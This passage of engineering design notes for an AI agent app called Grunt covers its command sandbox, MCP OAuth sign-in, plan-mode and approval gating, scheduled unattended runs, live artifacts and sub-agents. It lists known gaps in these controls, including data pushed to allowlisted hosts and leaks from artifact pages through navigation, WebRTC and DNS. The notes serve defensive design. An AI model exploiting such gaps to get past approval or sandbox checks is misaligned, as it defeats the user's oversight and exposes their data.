so a file the command made read-only (on a Windows folder, `chmod 444` sets the read-only attribute) or hard-linked elsewhere is still put back; a changed mode alone is put back too. The agent tells Grunt when the restore starts (`restoring`), and a cancel or a close then gives it up to 60 s instead of 5 s. It fails closed: when the agent says it couldn't put something back, or dies or is stopped after a command was sent and before it reported it, that chat and any chat that could write those folders are refused ("The sandbox couldn't confirm it undid changes to protected files in ...") until the chat is released (deleted) or the sandbox is repaired; this is kept in memory, so restarting Grunt also lifts it. Another chat's hold on a folder lasts until the agent has reported the run, restore included, or is gone. The command's result then ends "The sandbox undid changes to ... (protected files)." (Live, a protected file that doesn't exist yet can't be written in any spelling, because the runtime's empty placeholder for it comes out read-only on a Windows folder; the spelling trick works on existing files and on new files in a guarded folder such as `.git/hooks`, which is what the self-test exercises.) A protected file over 1 MB, or over 8 MB of them, refuses the run rather than skip the guard. Commands of different chats that can write the same folder (or one inside the other) run one after another, so one agent never copies, and later puts back, what another chat's command planted. The self-test and the live test write the protected files in both spellings and a sibling read-only folder in both spellings.
- **Root-side hardening.** Two scripts run as root in the distro and nothing they touch may be trusted. `mount.sh` validates paths exactly as `toSandboxPath` does (both sides are tested against the same vectors) and walks the mount path, refusing symlinks and any component that is neither root-owned nor on a read-only mount. Setup builds `/opt/grunt-sandbox` in a root-only staging directory under `/opt` on every setup and repair, verifies it (`npm ci --ignore-scripts`, then an ownership and permission check) and only then swaps it in, so nothing in an existing tree is trusted and nothing the `grunt` user can write is ever `chown`ed. If the runtime ever needs an install script, setup will fail at that step.
- **State.** `app_setting` key `sandbox`, machine-local (`SettingsRepo.getValue/setValue`), never synced; profiles sync with their new fields as before.
- **Test switch.** `GRUNT_SANDBOX=fake` swaps in `FakeSandbox` and exists for the e2e tests only (`packages/web/playwright.config.ts`). Nothing is isolated and nothing is run, and the server says so loudly at startup. Never set it outside tests.
- **Known limitations.**
  - A writable folder nested inside a read-only folder is read-only in the sandbox, because the runtime binds read paths after write paths. The other way round (a read-only folder inside a writable one) is refused, since the VM's case-insensitive folders would let another spelling write it.
  - A planted protected file exists on disk while the command runs: the agent puts it back only once the command has ended. Anything on Windows that reads it during that window (a `git` run, VS Code reloading tasks, a Claude Code turn in the same folder) sees it. If the agent dies mid-run (`wsl --shutdown`, sleep, a crash), nothing puts it back.
  - Protected paths are guarded at the top of each writable folder and the home only. A nested repository's `sub/.git/hooks` is guarded by the runtime in its exact spelling (its scan goes three levels down), but not against another spelling, and the agent doesn't copy it.
  - Changes made on Windows to a protected file while a sandboxed command runs in that folder are undone along with the command's. And while a command runs, the runtime puts empty placeholder files at the protected paths that don't exist (`.bashrc`, `.claude`, `CLAUDE.md`, ...) in the writable folders, which Windows tools can see until the command ends and the runtime removes them; an agent that dies mid-run leaves them behind.
  - A brand-new repository a command makes loses its `.git/config` and `.git/hooks` after the command (everything else in `.git` stays, and git works without them).
  - Two chats that can write the same folder no longer run sandboxed commands at the same time: the second waits for the first.
  - Folder names containing `,` or `;` can't be mounted (drvfs rejects them), so both validators refuse them.
  - A command whose agent dies mid-run fails; the next command for that chat gets a new agent.
  - Switching a folder from read-only to read-write while another chat still has it mounted can fail with "target is busy". It fails closed, so the command reports a mount failure.
  - A chat deleted by peer sync (not through this machine's routes) is never released here: its agent closes when idle and its folders are unmounted then, but its home and temp folders in the VM stay until the sandbox is removed (Settings > Sandbox > Remove). Deleting a chat, a profile or a connection here releases them.
  - Under ask on mutate a sandboxed command runs with no card even when the profile's file access is off or read-only, and the default allowlist includes write-capable hosts (`github.com`, `registry.npmjs.org`). A command can therefore push data out to an account the attacker controls. This was agreed in the spec, and it is worth revisiting if the default list changes.
  - The host-name check can't see DNS that points a public name at a private address (`127.0.0.1.nip.io`, rebinding). The connect-time guard covers that (checked live). It doesn't judge a literal-IP dial at all: that rests on the allowlist never holding a literal and on the agent's ask-time lookup (checked live too).
- **Scheduled runs and Plan mode.** A scheduled run sets `ToolContext.unattended` (the one flag thread cards added); a sandboxed command runs with no card under "Ask on changes", and its `sandbox_network` question is refused without a card unless a host grant already covers it (`approval_unavailable`, audited `deny:unattended`). Under "Ask before every call" the command itself is refused. In Plan mode, until the plan is approved, the broker refuses both `sandbox` and `network` calls like the host shell, before the sandbox's no-card pass and before any host grant.
- **Self-test and sign-in mode.** In sign-in mode (`--public-url`) Grunt's port speaks HTTPS only, so a plain-HTTP probe of it gets no status even when it connects. The self-test probes Grunt's port over both HTTP and HTTPS (`-k`) and needs both to fail to connect.
- **Not built.** Background processes in the sandbox; a Linux backend (phase 2); macOS.

### Sign-in for HTTP MCP servers

These follow spec 2026-10-12-mcp-oauth-design (Deck #931).

- **Detection.** Every http server without a fixed `Authorization` header (any case) gets Grunt's OAuth provider. One that answers 401 with no usable token shows "needs sign-in" (live status `needs_auth`, stored as `error`), stops retrying and offers no tools, to API profiles and Claude Code's relay alike. A fixed `Authorization` header turns this off: a 401 there is an ordinary error.
- **Signing in.** Settings > MCP servers > the server > Sign in… opens the provider in the system browser (desktop) or a new tab. Discovery (RFC 9728, then RFC 8414 or OpenID), dynamic registration (RFC 7591), PKCE S256, `state` and `resource` (RFC 8707) come from the MCP SDK, pinned to 1.30.0 in `packages/tools` because the provider relies on the order inside its `auth()`. Grunt registers as a public client named "Grunt", and registers again whenever the redirect address or the authorization server (its issuer) changes. A new registration is held in memory by the sign-in that made it (and reused by the next start) and only replaces the stored one when that sign-in completes, so a cancelled "Sign in again" leaves the registration the live tokens belong to in place.
- **The redirect address.** In open and token modes (the desktop app included) it is `http://127.0.0.1:<bound port>/oauth/callback`, so it changes on every desktop relaunch. In sign-in mode (`--public-url`, Deck #936) it is `<first --public-url>/oauth/callback`: https, it passes the Host check, and it works behind a trusted proxy, which matters because there the main port may speak only HTTPS and the loopback address wouldn't load. Public and loopback addresses are not registered side by side: each change of address just registers again.
- **Where things live.** Tokens, the registration (`{ redirectUri, issuer, info }`; one without an issuer, or made with another issuer, counts as absent) and a hand-registered secret: SecretStore, `mcp:<id>:oauth:tokens|client|client-secret`. SQLite: only `mcp_server.oauth` (`clientId`, `clientSecretRef`, `account`, `signedInAt`, migration 025). PKCE verifiers, `state` and discovery results: memory only. Nothing syncs between machines. Tokens are stored as `{ tokens, savedAt, resource }` and bound to the server URL they were issued for: a token whose `resource` differs from the server's current URL is never used.
- **Staying signed in.** Refresh is the SDK's own, on a 401, unattended; the 30-second health check usually refreshes before a tool call needs it. `invalid_grant` forgets the tokens (needs sign-in); a provider that is down is an ordinary error with backoff. A forget request within 60 seconds of saving new tokens is ignored (two requests racing a rotating refresh token). Each server has an in-memory token generation, bumped by every forget and every sign-in: a connection's provider captures it when it is built, and its saves and forgets from an older generation are dropped, so a refresh still in flight (the SDK's `transport.close()` doesn't abort it) can't bring tokens back after a sign-out or overwrite a newer sign-in.
- **The open callback route.** `GET /oauth/callback` sits outside `/api` and takes no bearer token or session cookie, because the system browser has neither. It can only finish a pending flow whose 256-bit `state` the caller already knows, once (removed on first lookup), within 10 minutes. The Host check (loopback binds and sign-in mode) blocks DNS rebinding there too; token mode on a non-loopback `--host` has no Host check, and the callback stays safe through the 256-bit single-use `state` alone. The page is plain HTML with no script, a `default-src 'none'` CSP, `no-referrer`, `no-store` and `nosniff`; it names the server (escaped) and shows a provider error by its sanitised code only. The callback URL holds the code and is never logged.
- **Another device.** In sign-in mode a browser on another device is redirected back to the public URL and needs nothing pasted. Paste-back remains for a browser elsewhere in open or token mode (it ends on a page that won't load; pasting that address into the pending sign-in finishes it, `POST /api/mcp-servers/:id/sign-in/complete`, same checks), and for a sign-in started from a second `--public-url` that the browser can't reach as the first.
- **Sign out** stops the connection and waits for it to close, then forgets the tokens and the registration here (a refresh still in flight is dropped, see above), keeps a hand-registered client, and reconnects, which then needs sign-in. It does not revoke at the provider.
- **Edits.** A PATCH reconnects an enabled server when it changes a connection setting (URL, transport, command or args by value; headers or env whenever sent, since the form sends them only when edited) or the Sign-in app (a different client ID, or a secret set or removed). A changed URL or client ID forgets the sign-in (a hand-registered client survives a URL change); switching to stdio or deleting the server forgets every OAuth secret.
- **Serialised changes.** A per-server lock serialises PATCH and DELETE reconfiguration (stop and await close, forget, update the row, reconnect), restart, sign-out and sign-in completion, so two of them can't interleave. A sync for another server's change leaves a server alone while it is being reconfigured. Overlapping sign-in starts for one server are serialised too, and the latest wins.
- **Configured headers** go only to the MCP server's own origin (a fetch wrapper adds them), never to an authorization server elsewhere: the SDK's `auth()` would merge a transport's `requestInit` headers into discovery, registration and token requests.
- **Redaction.** Every message that leaves the sign-in code, every connection's `lastError` and every failed tool call goes through `redactMessage` (`packages/tools/src/mcp/redact.ts`): known codes, verifiers, `state`, secrets and tokens (also percent-, form- and base64-encoded), `Bearer`/`Basic` credentials, sensitive `key=value` pairs, URL query, fragment and userinfo are removed, and the text is cut to 300 characters. A numeric `code`/`state` value ("exit code: 127") stays, and a configured env or header value is only treated as a secret when it looks like one (8 or more characters, not letters only), so `NODE_ENV=production` stays readable. The trade-off: a stdio server's error text is still capped and pattern-redacted.
- **URL comparisons** all go through `packages/tools/src/mcp/url.ts`. It parses once with WHATWG `new URL()` and compares parsed, normalised parts: host lower-cased and punycoded, trailing dot and default port dropped, RFC 3986 percent-encoding, the path kept exactly (`/mcp` is not `/mcp-evil`), no query or fragment. Userinfo, backslashes and whitespace are refused. An http server address with userinfo or a backslash is refused at create, PATCH and import, and a stored one gets no sign-in.
  - Authorization-server metadata whose `issuer` isn't the address it was discovered from is refused (RFC 8414 §3.3; SDK 1.30.0 doesn't check this).
  - Protected-resource metadata must name this server's address or a parent path on its origin (RFC 9728 as MCP applies it: the SDK falls back to the origin's root metadata).
  - Redirect URIs stay exact strings, as providers compare them.
- **No RFC 9207 `iss` check.** The authorization response's `iss` isn't compared with the expected issuer. A mix-up through a hostile server's metadata is inherent to MCP and the SDK (the server names its own authorization server); adding a server is a trust decision.
- **Sign-in app.** For providers without dynamic registration: a client ID and optional secret per server (the secret write-only, in SecretStore). The provider must accept the redirect address above; in open and token modes that means any loopback port, since the desktop app's port changes each launch.
- **Probe (Task 1, read-only).** `https://mcp.notion.com/mcp` and `https://mcp.linear.app/mcp` both advertise dynamic registration, allow a public client (`none`) and S256 PKCE, and use https authorization endpoints, so neither needs the Sign-in app. It registered nothing; redirect acceptance is still unchecked.
- **Live checks left for Adam** (nothing automated touched a real provider):
  - Desktop app and a real hosted server with dynamic registration (Notion or Linear): the system browser opens; registration accepts `http://127.0.0.1:<port>/oauth/callback` (if it refuses the IP literal, change `OAUTH_CALLBACK_HOST` in `packages/server/src/routes/mcp-sign-in.ts` to `'localhost'`); Grunt shows "Signed in"; the tools work in an API chat and, relayed, in a Claude Code chat.
  - Quit and relaunch (new port): still signed in, tools load. After the access token expires (usually an hour), calls still work. "Sign in again" after a relaunch works with the new port.
  - Browser mode (`npm run serve`): the same sign-in, in a new tab.
  - Sign-in mode (`--public-url`): a real provider accepts `<public url>/oauth/callback`, and a browser on another device finishes the sign-in with no paste-back.
  - A provider without dynamic registration (GitHub's MCP server with a hand-registered OAuth app, callback `http://127.0.0.1/oauth/callback`): the Sign-in app path.

### Thread cards: checklists, questions and plan mode

These follow spec `docs/superpowers/specs/2026-10-12-thread-cards-design.md` (git-ignored, like the other specs here). They put three things in the thread: a progress checklist, question cards and a Plan mode.

- **Checklist.** It is built from the reply's last `update_todos` call (API profiles) or `TodoWrite` call (Claude Code). Each call carries the whole list, so the newest one replaces the rest. The thread shows it as a checklist in place of a tool row, and the Inspector has a Progress section for the open chat. `parseTodos` is the strict check for `update_todos` input and `readTodos` the lenient one used for display.
- **Question cards.** The model asks one to four questions of two to four options each. The card always offers a free-text "Other", multi-select answers are joined with ", ", and the user can decline. Option previews are not shown. API profiles get the answers back as `User has answered your questions: "Q"="A". You can now continue with the user's answers in mind.` Claude Code's own tool result reads `Your questions have been answered ...` instead (see the probe notes below).
- **Plan mode.**
  - **Switch.** It is per chat (`chat.plan_mode`, migration `022-chat-plan-mode`, `PATCH /api/chats/:id` with `planMode`; 021 is reserved by other work). The composer has a **Plan** pill (`aria-label="Plan mode"`), saved optimistically and reverted if the save fails. It applies from the next message.
  - **Flow.** While it is on, the model sets out a plan with `propose_plan` and waits. The card offers Approve or "Ask for changes" with a note.
  - **Lifetime.** An approval lasts for the rest of that one reply. A compare variant, a retry and the next message each start closed again.
  - **Scope.** Approving a plan approves no tool call. Anything that changes something still gets its usual card or grant afterwards.
- **Sources and tools.**
  - **API profiles.** `ToolSource` has a new member, `'thread'`, with three tools: `update_todos`, `ask_user` and `propose_plan` (`core/src/domain/thread-tools.ts`, run by `tools/src/thread-tools.ts`). The policy allows them with no card and no grants after the policy check, and every call is audited like any other.
  - **Claude Code.** It keeps its own `TodoWrite` and `AskUserQuestion`. `AskUserQuestion` is answered inside the PreToolUse hook: the hook returns `allow` with the answers in `updatedInput.answers`, keyed by question text, so Grunt's card is the answer. `propose_plan` lives on Grunt's per-process server (`mcp__grunt_<16 hex>__propose_plan`) only while the reply is planning, and is reported as `propose_plan`. `EnterPlanMode` and `ExitPlanMode` are always disallowed (`agentDisallowedTools`), as Grunt's plan mode replaces them.
  - **Todo flag.** Newer models such as Sonnet are not offered `TodoWrite` in SDK sessions by default, so `buildChildEnv` sets `CLAUDE_CODE_ENABLE_TODO_TOOLS=1` for every Claude Code process.
- **What the probe found** (Task 1, `engine-claude-code/test/fixtures/README.md`, section "Thread tools"; decision `ASK_PATH=hook, TODO_FLAG=env`).
  - **Hook answer.** It worked live. The model got `Your questions have been answered: ...` and replied with the answer, and `canUseTool` was never called, so the hook gets there first as it does for other tools.
  - **Hook refusal.** A `deny` with a reason reaches the model wrapped as `PreToolUse:AskUserQuestion hook error: <reason>`. The turn still finishes `success`.
  - **Todos.** Sonnet lists `TodoWrite` with `CLAUDE_CODE_ENABLE_TODO_TOOLS=1`. Haiku lists it anyway.
  - **Clean chat.** The tools check (`tools: ['WebSearch', 'WebFetch', 'TodoWrite', 'AskUserQuestion']`) ran on Haiku only. A clean chat on Sonnet is unprobed.
  - **Fallbacks.** Task F (fallback ask and todo tools on Grunt's own server) was not needed and was not built.
- **The route.** `POST /api/asks/:id/answer` takes exactly one of `{ answers: string[] }`, `{ declined: true }`, `{ approve: true }` or `{ changes: string }`.
  - **Statuses.** 200 `{ answered: true }`; 404 when the ask is unknown or already settled; 400 when the body has the wrong shape, or doesn't fit the ask (an `approve` sent to a question, a `declined` sent to a plan, the wrong number of answers, a blank or over-long answer or change note).
  - **Paired machines.** It is forwarded to the machine running the chat, like `/approvals/:id/resolve`. The peer listener allows it for a paired machine.
  - **Limits.** At most 50 asks are pending at once. Past that the oldest is settled as cancelled and logged. Each answer is at most 4,000 characters, a change note 8,000 and a plan 20,000.
- **The planning rule.** Until the reply's plan is approved, `decide` (`core/src/domain/permissions.ts`) refuses any call that `allowedWhilePlanning` rejects. The refusal is "Plan mode is on: set out your plan with propose_plan and wait for the user's approval before changing anything.", with no card, audited `deny:plan`.
  - **Allowed while planning.** `thread`, `artifact` and `recall` tools. `fs` and `mcp` tools with risk `read`. Claude Code tools in the categories `file-read`, `web` and `internal`.
  - **Everything else is refused.** That includes any source added later, so the rule fails closed. It only adds refusals: an allowed call still goes on to its grants or card.
  - **Parallel calls.** On the AI SDK path a call made alongside `propose_plan` is refused, as the gate is still closed when it is decided. Claude Code runs Grunt's server tools one at a time and its PreToolUse hook runs just before each tool, so a Write sent in the same message as `propose_plan` reaches the gate after the user approves, and goes on to its normal card. That is not a bypass, the card still applies.
- **Unattended runs.** `ToolContext.unattended` and `EngineRequest.unattended` are added by this feature, and the schedule service now sets them (see Scheduled tasks below). When set, there is no card, no event, no notification and no tab dot. A question gets "Nobody is here to answer: this run is unattended. Use your judgement, carry on, and say in your reply what you assumed." A plan gets "Nobody can approve a plan in this run, so nothing may be changed. Don't propose it again; finish by setting out your plan in your reply.", and the gate stays closed. Unit tests cover both, and the scheduled-tasks e2e runs a refused tool call for real.
- **Telling you.** A pending question or plan counts like a pending tool approval: the tab dot (label "waiting for you") and a desktop notification, "Waiting for your answer" or "Plan waiting for your approval". The approvals toggle in Settings is now "Approvals, questions and plans".
- **Known gaps** (the first six are Phase 2 in the spec).
  - Cowork's `TaskCreate` and `TaskUpdate` are not folded into the checklist.
  - Option previews are not shown.
  - The tray's count is tool approvals only.
  - The quick-chat window has no cards.
  - There is no per-profile switch for any of this.
  - There is no "Approve, and allow file edits for this reply" shortcut on the plan card, so every write still gets its own card after the approval.
  - A subagent's `TodoWrite` replaces the reply's checklist.
  - The model can do something other than the plan it had approved. Each call's own card or grant is still the control.
  - On a paired machine, a reply that runs on the other machine asks for you there, but the question or plan is not announced app-wide on this one (no tab dot, no notification). The card itself shows in the thread through the relayed stream. Remote tool approvals already behave this way.
  - Clean chats on Sonnet have not been probed for `TodoWrite` and `AskUserQuestion` (see the probe notes above).
- **Live check (manual)** (spec section 9). Not done yet, these need a real Claude Code and a desktop window. Run it with a scratch data folder, not your real one, until the migration number is settled. This branch uses 022 while 021 is reserved for other work, and a database that runs 022 first would skip 021 for good.
  1. A Claude Code folder chat on Sonnet shows a checklist.
  2. Claude Code asks through the card, in a folder chat and in a clean chat (the clean chat on Sonnet is the unprobed case).
  3. With Plan on: a write is refused, the model proposes a plan, you ask for changes, it proposes again, you approve, and the write then gets its own card.
  4. A question while the window is unfocused raises a desktop notification.
  5. An API profile uses `ask_user` and `update_todos` sensibly.

### Scheduled tasks

Spec: `docs/superpowers/specs/2026-10-12-scheduled-tasks-design.md` (Deck #925). A schedule runs a prompt on a profile daily, on chosen weekdays or monthly, at a set time in the zone of the machine it was made on. It either adds a reply to a fixed chat or starts a new chat in a project (`<name> · 12 Oct 2026`, never auto-titled). The clock button in the sidebar footer opens the Scheduled overlay. "Schedule…" in a chat's or a project's menu opens the editor on that target.

- **Where it lives.** `schedule` and `schedule_run` (migration `023-schedules`) are local. They have no sync triggers, so a schedule runs only on the machine that holds it. Deleting its chat, project or profile deletes it. Archiving its profile leaves it, and its runs record "Didn't run" until the profile is changed.
- **When it runs.** `ScheduleService` (`packages/server/src/schedule/service.ts`) re-arms one timer for the earliest next run, never more than 30 s away, so sleep and clock changes are caught within 30 s. A schedule that missed slots runs once, marked late if more than 5 minutes past due. At most two scheduled runs go at once. A busy target chat makes its schedule wait, and a schedule still running at its next slot records that slot as "Didn't run". Runs stop after 30 minutes ("Timed out"). On start, a run left running by the previous process is marked as an error. `nextRunAt` moves before a run starts, so a crash never repeats a slot.
- **Unattended.** Every scheduled run (and Run now) is unattended: `TurnInput.unattended` → `EngineRequest.unattended` → `ToolContext.unattended`. The last two came from thread cards and nothing set them until now. The schedule service sets them, and `TurnInput.unattended` is new. `GruntToolProvider.settle` refuses any call that would raise a card with `approval_unavailable`, audited `deny:unattended` (the Inspector says "refused: nobody to approve (scheduled run)"), and the run's history counts them. Grants, read-only tools under "Ask on changes", artifacts and allowed web tools still run. Thread cards already answer for the model in an unattended run: a question gets the unattended text and a plan stays closed. Claude Code's auto mode is never used in a scheduled run. The flag is only ever set by the service, never from a request body, so the peer listener can't set it.
- **Sandbox.** Sandboxed commands run unattended under "Ask on changes" (no card). `unattendedWarnings` reads `ToolPolicy.shellRuns` through `runsShellInSandbox`: only a shell on this machine gets the "needs approval" line, and a sandboxed one gets a line saying hosts off its list are refused unless a grant already covers them (an Always grant, or one for the schedule's own chat).
- **Notifications.** Desktop only, shown even while Grunt is focused (Settings → Desktop → "Scheduled runs"). The run's own "Reply finished" is suppressed.
- **API.** `/api/schedules` (list, create, PATCH, DELETE, `/:id/runs`, `/:id/run` → 409 `{ kind: 'running' | 'busy' | 'full' }`). Not mounted on the peer listener.
- **Tests.** `packages/web/e2e/schedules.spec.ts` makes a chat schedule from the chat menu and a project schedule from the project menu, runs both with Run now, checks a refused `#recall` call shows no card, and pauses and resumes a schedule. Every schedule is set for twelve hours ahead so nothing fires on its own.

### Live artifacts

Spec: `docs/superpowers/specs/2026-10-12-live-artifacts-design.md` (Deck #929). An html artifact can declare calls to read-only MCP tools, and its page fetches the results with `grunt.live(callId, params?)` while it is open in the viewer. The point is a dashboard that stays current (tasks, calendar) without the model rewriting it each time. The page must include `<script src="grunt-live.js"></script>` itself, Grunt never rewrites the model's HTML.

- **Where it lives.** Migration `024-artifact-version-live` adds a `live` column to `artifact_version` (JSON or NULL), and it syncs with the row. 022 (chat plan mode) and 023 (schedules) come before it on this branch, and 021 is still reserved. A stored declaration that no longer parses reads as none (`storedLive` in `store-sqlite/src/repos/artifacts.ts`), so the page is then served with the ordinary artifact policy, which is looser than the live one. No tool call is possible from it, as there is no declaration to match.
- **The declaration.** At most 10 calls and 32 KB in all, `args` at most 4 KB, at most 5 params a call. Params are an enum (1-50 values) or a bounded integer, so there is no free text and no dates. `parseLiveSpec` in core is the one check. `update` keeps the declaration and so does a user edit. A `rewrite` without `live` keeps it as well, one given a new declaration replaces it, and `{"calls":[]}` or a change to a kind other than html drops it.
- **Approval.** One grant per call, bound to the SHA-256 of `{ tool, args, params }`. `PermissionBroker.decideLive` is the only branch that sees a live call, and it is the first thing `decide()` does. The viewer answers `not_approved` itself for a call that isn't allowed yet, without calling the server.
- **The live CSP**, as shipped in `livePolicy` (`packages/server/src/routes/view-serve.ts`), with `X-DNS-Prefetch-Control: off` beside it:

  ```
  sandbox allow-scripts allow-forms; default-src 'none'; script-src 'unsafe-inline' <link folder>grunt-live.js; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; object-src 'none'; manifest-src 'none'; form-action 'none'; base-uri 'none'
  ```

  The spec had a shorter list that left `connect-src`, `frame-src` and `worker-src` to fall back to `default-src`. A security review asked for them to be written out, and for `script-src` to name the exact helper URL rather than the whole folder. Other versions still get `sandboxPolicy`.
- **What the tests prove.** `packages/web/e2e/live-exfil.spec.ts` serves a page under the real `livePolicy` that tries about 35 ways of sending a result out (fetch, XHR, WebSocket, forms, images, fonts, workers and so on), and none of them makes a request. A control run with no policy shows the watches do see them. `packages/web/e2e/live-probe.spec.ts` pins what Chromium does with the frame: `event.source` is the page's frame, so the bridge needs no nonce.
- **Limits.** Per artifact on the server: 4 calls in flight and 30 uncached calls in a rolling minute, else `rate_limited`. The first `rate_limited` in a minute gets an audit row and the rest are only counted, and the count goes on the artifact's next audited row (`error: timeout (+3 rate_limited calls not audited)`), so a page that keeps asking can't grow the audit table without bound. Per frame in the viewer: 4 calls sent at once, as the server allows no more, with the rest queued in order up to 16 outstanding, else `busy`. A dashboard that asks for all its calls together then gets every one rather than having the fifth refused. A queued request whose frame has been replaced, or whose page has gone, is dropped without being sent. Requests over 16 KB of JSON are ignored. Each call times out after 30 s (the helper gives up at 45 s). A result is text and structured JSON only, up to 1 MB, else `too_large`. Results are cached for 30 s in memory, at most 100 entries, and a `fresh` request skips the cache.
- **Names and server ids.** A live grant is bound to the namespaced tool name (`mcp__<server>__<tool>`) and to the MCP server's id (`constraint.live.serverId`). The provider takes the id from its own lookup of the tool, never from the page. If two servers of the profile share a name, or sanitising makes two names equal, the call is unavailable ("names more than one tool"). A renamed server needs a fresh OK, as its tools' names change. So does a server deleted and added again, or another server renamed to a granted name, as its id differs. Grants made before this have no server id, so they never match and the viewer asks for a fresh OK. "Stop live data" still removes all of an artifact's grants.
- **What an approval trusts.** It binds to the declaration, not to the page's code, so a rewrite that keeps the same calls keeps the approval and can do anything with the results that the sandbox allows. `readOnlyHint` is the server's own claim, Grunt can't check it. Calls run on the machine serving the UI and grants don't sync, so a paired laptop is approved on its own.
- **Residual leaks** (spec section 12). All of them are known, and the approval panel says so.
  - **Navigating its own frame.** The page can put data in the address (`location=`, a meta refresh). The viewer counts `load` events, and a second one closes the page ("This page went to another address, so Grunt closed it."), but the request has already gone. The guard is a best-effort notice for navigations that commit, and there are two cases it doesn't cover.
  - **A navigation that never commits.** One answered with 204 or 205, or one that turns into a download, leaves the page where it is, so no `load` fires and the page is never closed. The address has still been fetched.
  - **Navigating before the first load.** Counting loads can't see a navigation made before the page's first `load` event, so the document that replaces it is taken for the page. That document may be a foreign page with full network access, as the live CSP came with the page and not with it, and while the view stays open it is answered as if it were the page: it can make any allowed call with the allowed params, and a call the page made before leaving can have its answer delivered to it (noted in `live-bridge.ts`). What it can reach is no more than the address leak above already gives away, as the page could have put the same results in the address itself.
  - **Phase 2 idea.** The iframe `csp` attribute (CSP Embedded Enforcement), which Chromium and WebView2 support, would make the frame require the live policy of any document it loads, so a foreign page that won't agree to it isn't shown. It needs checking against how the viewer serves the page before it can be relied on.
  - **WebRTC** to a STUN or TURN host, which CSP doesn't govern in Chromium.
  - **DNS** lookups that slip past `X-DNS-Prefetch-Control: off`. `preconnect` and `dns-prefetch` open no socket in Playwright's Chromium even with no policy, so the exfil spec can't speak for them.
- **Tests.** Unit tests in core (`live-artifacts.test.ts`, `permissions.test.ts`), tools (`live-calls.test.ts`, `provider-live.test.ts`), the viewer's `live-bridge.test.ts`, `LiveBar.test.tsx` and `ArtifactView.test.tsx` in web, and the e2e specs `live-artifacts.spec.ts` (a live page through the Mock model and a fixture MCP server), `live-exfil.spec.ts` and `live-probe.spec.ts`.

### Sub-agents (API profiles)

These follow spec 2026-10-12-api-subagents-design (Deck #930).

- **What.** A profile switch, Settings > Profiles > "Sub-agents" (`toolPolicy.subagents`, off by default, API profiles only), offers the `subagent` tool. The model gives it a label, a prompt, optionally a profile name and optionally fewer tools. The sub-agent runs its own model loop through the same engine, with tools from the same provider, gated by the same broker, under the same chat and reply. Its final text (what it wrote after its last tool call) is the tool result.
- **Where.** `packages/core/src/domain/subagent.ts` (rules and `SubagentRunner`), `domain/parts.ts` (the `subagent` part and `applySubagentEvent`, shared by server, peer relay and web), `TurnRunner.runVariant` (makes a runner per reply), `packages/tools/src/subagent-tool.ts`, `engine-aisdk`'s `buildToolSet` (via `toolContextFor`, in `packages/core/src/domain/tool-context.ts`), `web/src/components/SubagentCard.tsx`. The mock's `#subagents <rest>` trigger drives the e2e (`packages/web/e2e/subagents.spec.ts`).
- **Profiles.** "This profile" or any unarchived API profile whose connection works on this machine (`eligibleSubagentProfiles`), by name. Claude Code profiles can't be chosen and never get the tool; their own Task/Agent is unchanged.
- **Tools.** What both profiles' policies allow, narrowed by the call (`subagentPolicy`); `always_ask` wins; never artifacts or sub-agents. Grants are matched and stored under the parent reply's own profile, never the one it runs as (`SubagentTag.parentProfileId`, applied in `toolContextFor`), so picking a profile with more grants can't skip a card. Approval cards carry "Sub-agent: <label>", plus "(runs as <profile>)" when it isn't the reply's own, and sit under the parent reply; audit rows use the parent reply's id.
- **Context.** Its profile's own prompt, `SUBAGENT_ROLE_PROMPT`, the folders note when the chat has extra folders, the tools note when its connection names its tools, and recall guidance when offered. No history, memory or project instructions.
- **Limits.** One level deep. 4 at once per reply (the rest wait), 10 per reply, 20 steps each. Its answer is cut at 20,000 characters; the stored copy of each of its tool results at 4,000. Refusals (an unknown profile, bad tools, Stop before it started) count toward the 10, as the spec's step order implies.
- **Storage.** Its transcript is a `subagent` part in the parent reply's `parts`. Each finished sub-agent writes its own usage row on the reply with `usage.subagent_call_id` (migration 026). The compare tabs show only the reply's own cost; the Inspector's spend and the Usage view include sub-agents (`ProfileRollup.subagentCount`).
- **Robustness details.**
  - A finished (terminal) `subagent` part ignores later events, so an out-of-order relay can't reopen a settled card.
  - `isSubagentEvent` requires finite, non-negative usage numbers and keeps only the four known fields.
  - A sub-agent's card always closes: if its usage row can't be written, the failure is swallowed and the `end` event is still sent; if storing its `start` throws, the `end` still follows.
  - The web reducer folds a `subagent` event only when its call id is a string and `isSubagentEvent` passes; a card with no `parts`, or usage without both token counts, still renders.
  - A reply kept after the machine running it went away (`keepCutOffReply`) closes any card still queued or running as an error naming that machine.
  - The Markdown/HTML export escapes a sub-agent's label, profile name and model id, so a model-written label can't break out of the `<summary>`.
- **Stop.** The reply's Stop stops every sub-agent and settles their cards; `runVariant` waits for them before writing its final status. A restart turns a running card into an error.
- **Gaps (phase 2).** No Stop per sub-agent. A stopped sub-agent's tokens aren't counted (same gap as a stopped reply). The reply footer and compare tabs don't include sub-agent cost. No per-profile list of allowed sub-agent profiles. Whether the calls of one step really run at once depends on the model making parallel calls; the AI SDK side is pinned by a test in `engine-aisdk/test/engine.test.ts`.
- **Not on this branch yet (for integration).** This work was built on a branch without the sandbox, thread cards or scheduled-tasks plans, so these are missing and must be added when they meet:
  - `subagentPolicy` has no sandbox narrowing (`shellRuns`, `sandboxHosts`), and `extraFoldersPrompt` has no second parameter for it.
  - `SubagentRunner.requestFor` doesn't carry the parent's plan gate (`ctx.plan`) or `ctx.unattended` onto the sub-agent request.
  - There is no `allowedWhilePlanning` case for `subagent` (it should be allowed while planning).
  - `NEVER_FOR_SUBAGENTS` names `thread` but nothing filters a thread tool source yet.
  - `domain/tool-context.ts` (`toolContextFor`) was created here. If thread cards also creates it, merge the two: theirs adds `plan`/`unattended`, ours adds `toolCallId`/`subagents`/`subagent`.
  - **Migration 022 MUST be renumbered before merge.** feat/cowork-parity-all already uses 022-025, and real databases sit at `user_version` 24-25, so a migration numbered 022 is skipped there (migrations only run when the version is above `user_version`) and every usage write then fails, because the usage repo always writes `subagent_call_id`. Renumber it above the highest migration on the target branch. (On this branch 021 is reserved; a dev database that ran 022 here skips 021 when it lands, so re-apply 021 or recreate the database.)

## Encryption at rest

Provider API keys and other secrets live in `secrets.json` next to the
database (`<dirname(dbPath)>/secrets.json`), AES-256-GCM encrypted, key
derived via scrypt. The passphrase itself is either `GRUNT_SECRETS_PASSPHRASE`
if you set it, or — the default — a random 256-bit value generated once and
persisted at `secrets.json.key`, right beside the ciphertext it unlocks
